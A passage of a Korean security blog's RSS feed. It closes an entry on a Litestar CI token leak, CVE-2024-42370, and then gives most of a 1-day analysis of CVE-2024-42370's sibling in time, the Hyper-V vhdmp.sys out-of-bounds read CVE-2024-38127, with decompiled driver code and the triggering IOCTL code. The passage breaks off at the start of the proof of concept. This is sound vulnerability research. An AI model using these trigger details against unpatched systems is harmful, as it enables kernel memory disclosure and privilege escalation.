&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs vim">Issue<span class="hljs-variable">s:</span> <span class="hljs-keyword">write</span>Metadat<span class="hljs-variable">a:</span> <span class="hljs-keyword">read</span>PullRequest<span class="hljs-variable">s:</span> <span class="hljs-keyword">write</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xACE0;, <code>DOCS_PREVIEW_DEPLOY_TOKEN</code> &#xD1A0;&#xD070; &#xC815;&#xBCF4;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/09/18/ogu123/cve-2024-42370/image.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC815;&#xADDC; &#xD45C;&#xD604;&#xC2DD;&#xC744; &#xD1B5;&#xD574; <code>.pr_number</code>&#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; &#xC22B;&#xC790;&#xC778;&#xC9C0; &#xAC80;&#xC99D;&#xD558;&#xB3C4;&#xB85D; <a href="https://github.com/litestar-org/litestar/blob/main/.github/workflows/docs-preview.yml">&#xD328;&#xCE58;</a>&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42370">https://nvd.nist.gov/vuln/detail/CVE-2024-42370</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Litestar/">Litestar</category>
      
      <category domain="https://hackyboiz.github.io/tags/Environment-Variable-Injection/">Environment Variable Injection</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/18/ogu123/cve-2024-42370/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Hyper-V 1-day Class: CVE-2024-38127</title>
      <link>https://hackyboiz.github.io/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/</link>
      <guid>https://hackyboiz.github.io/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/</guid>
      <pubDate>Sun, 15 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, pwndorei&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xC5B4;&#xAE40;&#xC5C6;&#xC774; Hyper-V 1-day &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xB2EC;&#xC5D0; &#xB098;&#xC628; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB2C8;&#xACE0; &#xC800;&#xBC88; &#xB2EC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; CVE-2024-38127&#xC774;&#xB780; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xB2EC;&#xC5D0;&#xB3C4; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD558;&#xB098; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xB358;&#xB370; &#xC2DC;&#xAC04;&#xC774; &#xB41C;&#xB2E4;&#xBA74; &#xADF8;&#xAC70;&#xB3C4; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;.</p><h1 id="CVE-2024-38127"><a href="#CVE-2024-38127" class="headerlink" title="CVE-2024-38127"></a>CVE-2024-38127</h1><ul><li>Impact: Elevation of Privilege</li><li>Max Severity: Important</li><li>Weakness: CWE-126(Buffer Over-read)</li><li>poc: <a href="https://github.com/pwndorei/CVE-2024-38127">https://github.com/pwndorei/CVE-2024-38127</a></li></ul><h2 id="Affected-Product-amp-Version-Information"><a href="#Affected-Product-amp-Version-Information" class="headerlink" title="Affected Product &amp; Version Information"></a>Affected Product &amp; Version Information</h2><ul><li>Windows 10 Version 1607 for x64-based Systems &lt; 10.0.14393.7259</li><li>Windows 11 Version 24H2 for x64-based Systems &lt; 10.0.26100.1457</li><li>Windows 10 for x64-based Systems &lt; 10.0.10240.20751</li><li>Windows 11 Version 23H2 for x64-based Systems &lt; 10.0.22631.4037</li><li>Windows 11 Version 23H2 for ARM64-based Systems &lt; 10.0.22631.4037</li><li>Windows 10 Version 22H2 for x64-based Systems &lt; 10.0.19045.4780</li><li>Windows 11 Version 22H2 for x64-based Systems &lt; 10.0.22621.4037</li><li>Windows 11 Version 22H2 for ARM64-based Systems &lt; 10.0.22621.4037</li><li>Windows 10 Version 21H2 for x64-based Systems &lt; 10.0.19044.4780</li><li>Windows 11 version 21H2 for ARM64-based Systems &lt; 10.0.22000.3147</li><li>Windows 11 version 21H2 for x64-based Systems &lt; 10.0.22000.3147</li><li>Windows 10 Version 1809 for x64-based Systems &lt; 10.0.17763.6189</li><li>&#x2026;</li></ul><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>CVE-2024-38127&#xC740; Hyper-V&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; EoP &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB97C; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD55C; &#xACBD;&#xC6B0; &#xACF5;&#xACA9;&#xC790;&#xB294; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Weakness(CWE-126)&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; OOB Read&#xC774;&#xACE0; Microsoft&#xAC00; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38127">&#xACF5;&#xAC1C;&#xD55C; &#xC815;&#xBCF4;</a>&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xBD24;&#xC744; &#xB54C; &#xC2E4;&#xC81C;&#xB85C; EoP &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;&#xB294; &#xBCF4;&#xAE30; &#xD798;&#xB4E4; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Patch-Diffing"><a href="#Patch-Diffing" class="headerlink" title="Patch Diffing"></a>Patch Diffing</h2><p>patch diffing&#xC5D0;&#xB294; Windows 11 22H2 &#xD658;&#xACBD;&#xC5D0;&#xC11C; 2024&#xB144; 7&#xC6D4;(KB5040442)&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; 2024&#xB144; 8&#xC6D4;(KB5041585) &#xD328;&#xCE58;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB3C4; Patch-V&#xB85C; &#xAD00;&#xB828; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xCD94;&#xCD9C; &#xBC0F; &#xD328;&#xCE58;&#xB97C; &#xC9C4;&#xD589;&#xD588;&#xACE0; &#xC9C0;&#xB09C; CVE-2024-38080&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xB294; EoP &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;(.sys)&#xB97C; &#xC9D1;&#xC911;&#xC801;&#xC73C;&#xB85C; diffing&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; vhdmp.sys&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xACE0; &#xD574;&#xB2F9; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC774;&#xB984;(Virtual Hard Disk Mini Port)&#xCC98;&#xB7FC; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xC640; &#xC5F0;&#xAD00;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC544;&#xB798;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; <code>VhdmpiQueryMetaData</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-3672"><a href="#VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-3672" class="headerlink" title="VhdmpiQueryMetaData (vhdmp.sys 10.0.22621.3672)"></a><code>VhdmpiQueryMetaData</code> (vhdmp.sys 10.0.22621.3672)</h2><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VhdmpiQueryMetadata</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        struct _VHD_HANDLE_CONTEXT *a1,</span></span><span class="hljs-function"><span class="hljs-params">        struct _VHD_VIRTUAL_DISK *a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 SystemBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *OutputBufferLengthPtr)</span></span><span class="hljs-function"></span>{...  v5 = *((_QWORD *)a2 + <span class="hljs-number">18</span>);  v41 = <span class="hljs-number">0</span>;  VhdmpiAcquirePassiveLock(v5 + <span class="hljs-number">1120</span>);  <span class="hljs-keyword">if</span> ( !SystemBuffer )    <span class="hljs-keyword">goto</span> LABEL_86;  v10 = OutputBufferLengthPtr;  <span class="hljs-keyword">if</span> ( !OutputBufferLengthPtr )    <span class="hljs-keyword">goto</span> LABEL_86;  OutputBufferLength = *OutputBufferLengthPtr;  v12 = <span class="hljs-number">32</span>;  <span class="hljs-keyword">if</span> ( *OutputBufferLengthPtr &lt; <span class="hljs-number">0x20</span> )    <span class="hljs-keyword">goto</span> LABEL_86;  *(_OWORD *)SystemBuffer = <span class="hljs-number">0</span>i64;  *(_OWORD *)(SystemBuffer + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>i64;  v13 = *(_QWORD *)v5;  <span class="hljs-keyword">if</span> ( *(<span class="hljs-keyword">char</span> ***)v5 != &amp;IsoParser )  {    <span class="hljs-keyword">if</span> ( a3 &gt; <span class="hljs-number">0x3E8</span> )      <span class="hljs-keyword">goto</span> LABEL_86;    <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1000</span> )    {      *(_DWORD *)SystemBuffer = <span class="hljs-number">1000</span>;      VhdmpiVirtualDiskToInstanceId((__int64)a2, (_OWORD *)(SystemBuffer + <span class="hljs-number">8</span>));      <span class="hljs-keyword">goto</span> LABEL_18;    }    <span class="hljs-keyword">if</span> ( a3 &lt;= <span class="hljs-number">8</span> )    {      ...      <span class="hljs-keyword">if</span> ( a3 )      {        <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> )        {          *(_DWORD *)SystemBuffer = <span class="hljs-number">1</span>;          (*(<span class="hljs-keyword">void</span> (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + <span class="hljs-number">216</span>i64))(v5, SystemBuffer + <span class="hljs-number">8</span>);          <span class="hljs-keyword">goto</span> LABEL_25;        }        <span class="hljs-keyword">if</span> ( a3 != <span class="hljs-number">2</span> )        {          <span class="hljs-keyword">switch</span> ( a3 )          {            ...            <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:                            <span class="hljs-comment">//[1]</span>              v24 = *(<span class="hljs-keyword">unsigned</span> __int16 *)(v5 + <span class="hljs-number">88</span>);              *(_DWORD *)SystemBuffer = <span class="hljs-number">5</span>;LABEL_54:              OutputLength = v24 + <span class="hljs-number">0x22</span>;<span class="hljs-comment">//[2]</span>              <span class="hljs-keyword">if</span> ( OutputBufferLength &gt;= (<span class="hljs-keyword">int</span>)v24 + <span class="hljs-number">0x22</span> )              {                *(_DWORD *)(SystemBuffer + <span class="hljs-number">12</span>) = v24 + <span class="hljs-number">2</span>;                v26 = (<span class="hljs-keyword">void</span> *)(SystemBuffer + <span class="hljs-number">16</span>);                *(_BYTE *)(SystemBuffer + <span class="hljs-number">8</span>) = <span class="hljs-number">1</span>;                v27 = v24;                memmove(v26, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)(v5 + <span class="hljs-number">96</span>), v24);<span class="hljs-comment">//[3]</span>                *((_WORD *)v26 + (v27 &gt;&gt; <span class="hljs-number">1</span>)) = <span class="hljs-number">0</span>;              }              *v10 = OutputLength;<span class="hljs-comment">//[4], v10 == OutputBufferLengthPtr</span>              <span class="hljs-keyword">goto</span> LABEL_26;            ...          }...}</code></pre><p>&#xC704; &#xD568;&#xC218;&#xB294; &#xC774;&#xB984;&#xCC98;&#xB7FC; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xCFFC;&#xB9AC;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xBA70; <code>DeviceIoControl</code>&#xC744; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xC758; &#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>a3</code>&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xCCAB; 4&#xBC14;&#xC774;&#xD2B8; &#xAC12;&#xC73C;&#xB85C; <code>if</code> &#xBB38;&#xC774;&#xB098; <code>switch-case</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC12;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xB3D9;&#xC791;(&#xC5B4;&#xB5A4; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xCFFC;&#xB9AC;&#xD560;&#xC9C0; &#xB4F1;)&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xC758; &#xB124; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>SystemBuffer</code>&#xB294; &#xBCC0;&#xC218;&#xBA85;&#xCC98;&#xB7FC; IRP&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xB85C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xB294; &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xC5D0; &#xBCF5;&#xC0AC;&#xB418;&#xC5B4; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD568;&#xC218;&#xC758; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>OutputBufferLengthPtr</code>&#xB294; IRP&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;(&#xCEE4;&#xB110;&#xACF5;&#xAC04;)&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xACF5;&#xAC04; &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xB420; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>a3</code>&#xC774; 5&#xC77C; &#xB54C; &#xC2E4;&#xD589;&#xB418;&#xB294; [1]&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBD84;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; [2]&#xC5D0;&#xC11C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; <code>OutputLength</code> &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;(<code>OutputBufferLength</code>)&#xC640; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;(<code>OutputLength</code>)&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xB294;&#xB370; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xB354; &#xC791;&#xB2E4;&#xBA74; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xBD80;&#xC871;&#xD55C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>if</code> &#xBB38; &#xB0B4;&#xBD80;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xB370;&#xC774;&#xD130; &#xBCF5;&#xC0AC;&#xB97C; &#xC704;&#xD55C; <code>memmove</code>([3])&#xB3C4; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>if</code> &#xBB38; &#xB0B4;&#xBD80;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB354;&#xB77C;&#xB3C4; [4]&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xB420; &#xD06C;&#xAE30;&#xAC00; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;(<code>OutputLength</code>)&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070; &#xAC12;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB420; &#xB54C; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC640; &#xC778;&#xC811;&#xD55C; non paged pool &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; OOB Read&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof-of-Concept"></a>Proof-of-Concept</h1><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>VhdmpiQueryMetaData</code> &#xD568;&#xC218;&#xB294; &#xC544;&#xB798;&#xC758; <code>VhdmpiGetMetaInformation</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; [4]&#xB97C; &#xBCF4;&#xBA74; <code>OutputBufferLength</code>&#xC758; &#xAC12;&#xC774; <code>irp&#x2192;IoStatus.Information</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xB370; &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C; &#xB2E4;&#xB8EC; &#xAC83;&#xCC98;&#xB7FC; &#xC774;&#xB85C; &#xC778;&#xD574; OOB Read&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VhdmpiGetMetaInformation</span><span class="hljs-params">(struct _VHD_HANDLE_CONTEXT *a1, struct _IRP *irp)</span></span><span class="hljs-function"></span>{  ...  v6 = VhdmpiValidateMetadataAccessForHandle(a1, <span class="hljs-number">1</span>);  <span class="hljs-keyword">if</span> ( v6 &gt;= <span class="hljs-number">0</span> )  {    ...    <span class="hljs-keyword">else</span>                                            {      SystemBuffer = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)irp-&gt;AssociatedIrp.SystemBuffer;      OutputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;      v6 = VhdmpiQueryMetadata(             a1,             (struct _VHD_VIRTUAL_DISK *)v7,             *SystemBuffer,             (__int64)SystemBuffer,             &amp;OutputBufferLength);      <span class="hljs-keyword">if</span> ( v6 &lt; <span class="hljs-number">0</span> )      {        ...      }      <span class="hljs-keyword">else</span>      {        v6 = <span class="hljs-number">0</span>;        irp-&gt;IoStatus.Information = OutputBufferLength;<span class="hljs-comment">//[4]</span>      }    }    VhdmpiReleasePassiveLockShared(v8);  }  <span class="hljs-keyword">if</span> ( v6 &lt; <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> LABEL_15;  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v6;}</code></pre><p>&#xC704; &#xD568;&#xC218;&#xB294; <code>VhdmpiIsoControlObjectDeviceControlHandler</code> &#xD568;&#xC218;&#xB098; &#xC544;&#xB798;&#xC758; <code>VhdmpiVhdControlObjectDeviceControlHandler</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; <code>VhdmpiVhdControlObjectDeviceControlHandler</code>&#xC5D0;&#xC11C;&#xB294; IoControlCode&#xAC00; 0x2D1940&#xC77C; &#xB54C; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VhdmpiVhdControlObjectDeviceControlHandler</span><span class="hljs-params">(struct _VHD_HANDLE_CONTEXT *a1, struct _IRP *irp)</span></span><span class="hljs-function"></span>{  CurrentStackLocation = irp-&gt;Tail.Overlay.CurrentStackLocation;  IoControlCode = CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;  <span class="hljs-keyword">if</span> ( !*((_QWORD *)a1 + <span class="hljs-number">38</span>) )    <span class="hljs-keyword">goto</span> LABEL_3;  v21 = *((_DWORD *)a1 + <span class="hljs-number">1</span>);  <span class="hljs-keyword">if</span> ( (v21 &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )  {    <span class="hljs-keyword">if</span> ( IoControlCode == <span class="hljs-number">0x2D1A54</span> )      <span class="hljs-keyword">goto</span> LABEL_217;LABEL_38:    InternalScsiAddress = <span class="hljs-number">-1073741811</span>;    <span class="hljs-keyword">goto</span> LABEL_16;  }  <span class="hljs-keyword">if</span> ( (v21 &amp; <span class="hljs-number">0x800</span>) != <span class="hljs-number">0</span> )  {    ...  }  <span class="hljs-keyword">if</span> ( IoControlCode &lt;= <span class="hljs-number">0x2D19C6</span> )  {    ...    <span class="hljs-keyword">else</span>    {      <span class="hljs-keyword">if</span> ( IoControlCode == <span class="hljs-number">0x2D197C</span> )        <span class="hljs-keyword">goto</span> LABEL_146;      <span class="hljs-keyword">if</span> ( IoControlCode == <span class="hljs-number">0x41018</span>        || IoControlCode == <span class="hljs-number">0x2D191C</span>        || IoControlCode == <span class="hljs-number">2955552</span>        || IoControlCode == <span class="hljs-number">2955568</span>        || IoControlCode == <span class="hljs-number">2955572</span>        || IoControlCode == <span class="hljs-number">2955584</span>        || IoControlCode == <span class="hljs-number">2955588</span>        || IoControlCode == <span class="hljs-number">2955592</span>        || IoControlCode == <span class="hljs-number">2955600</span> )      {LABEL_18:        <span class="hljs-keyword">if</span> ( IoControlCode &lt;= <span class="hljs-number">0x2D1960</span> )        {          <span class="hljs-keyword">if</span> ( IoControlCode != <span class="hljs-number">0x2D1960</span> )          {            <span class="hljs-keyword">if</span> ( IoControlCode &lt;= <span class="hljs-number">0x2D1944</span> )            {              <span class="hljs-keyword">if</span> ( IoControlCode != <span class="hljs-number">0x2D1944</span> )              {                v15 = IoControlCode - <span class="hljs-number">0x41018</span>;                <span class="hljs-keyword">if</span> ( !v15 )                {                  ...                v16 = v15 - <span class="hljs-number">0x290904</span>;                <span class="hljs-keyword">if</span> ( !v16 )                     <span class="hljs-comment">// IoControlCode == 0x2d191c</span>                {                  ...                }                v17 = v16 - <span class="hljs-number">4</span>;                <span class="hljs-keyword">if</span> ( !v17 )                     <span class="hljs-comment">// IoControlCode == 0x2d1918</span>                {                  ...                }                v18 = v17 - <span class="hljs-number">4</span>;                <span class="hljs-keyword">if</span> ( v18 )                      <span class="hljs-comment">// IoControlCode != 0x2d1914</span>                {                  v19 = v18 - <span class="hljs-number">0xC</span>;                  <span class="hljs-keyword">if</span> ( v19 )                  {                    v20 = v19 - <span class="hljs-number">4</span>;                    <span class="hljs-keyword">if</span> ( v20 )                    {                      <span class="hljs-keyword">if</span> ( v20 == <span class="hljs-number">0xC</span> )         <span class="hljs-comment">// IoControlCode == 0x2D1940</span>                                                <span class="hljs-comment">// Call VhdmpiGetMetaInformation -&gt; VhdmpiQueryMetadata</span>                      {                        InternalScsiAddress = VhdmpiGetMetaInformation(a1, irp);                        <span class="hljs-keyword">if</span> ( InternalScsiAddress &gt;= <span class="hljs-number">0</span> )                          <span class="hljs-keyword">goto</span> LABEL_14;                        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)dword_1C0082048 &lt;= <span class="hljs-number">2</span> || !tlgKeywordOn((__int64)&amp;dword_1C0082048, <span class="hljs-number">4L</span>L) )                          <span class="hljs-keyword">goto</span> LABEL_16;                        v22 = <span class="hljs-number">4309</span>;                        pszFormat = <span class="hljs-string">&quot;VhdmpiVhdControlObjectDeviceControlHandler: query virtual disk metadata request failed (0x%08x)&quot;</span>;                        <span class="hljs-keyword">goto</span> LABEL_91;                      }                      <span class="hljs-keyword">goto</span> LABEL_227;                    }                  ...                }              }...}</code></pre><p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD55C; IoControlCode&#xB97C; &#xC54C;&#xC544; &#xB0C8;&#xC73C;&#xB2C8; <code>DeviceIoControl</code>&#xC744; &#xD638;&#xCD9C;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. <code>DeviceIoControl</code>&#xC5D0;&#xB294; <code>VirtDisk.h</code>&#xC5D0; &#xC815;&#xC758;&#xB41C; <code>OpenVirtualDisk</code>&#xB098; <code>CreateVirtualDisk</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC5BB;&#xC5B4;&#xC9C4; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xC758; HANDLE&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; CreateVirtualDisk&#xC744; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xB97C; 